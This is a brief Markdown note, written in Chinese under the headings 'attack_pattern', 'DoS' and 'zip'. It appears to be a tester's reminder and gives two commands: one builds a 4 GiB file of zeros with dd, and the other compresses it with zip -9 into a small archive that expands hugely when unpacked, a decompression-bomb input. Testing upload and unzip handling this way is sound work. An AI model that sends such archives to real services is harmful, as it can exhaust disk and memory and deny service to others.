# attack_pattern

## DoS

### zip

1. 使用root制作高压缩比文件：`dd if=/dev/zero count=$((1024*1024)) bs=4096 > big.csv`
1. 压缩：`zip -9 big.zip big.csv`
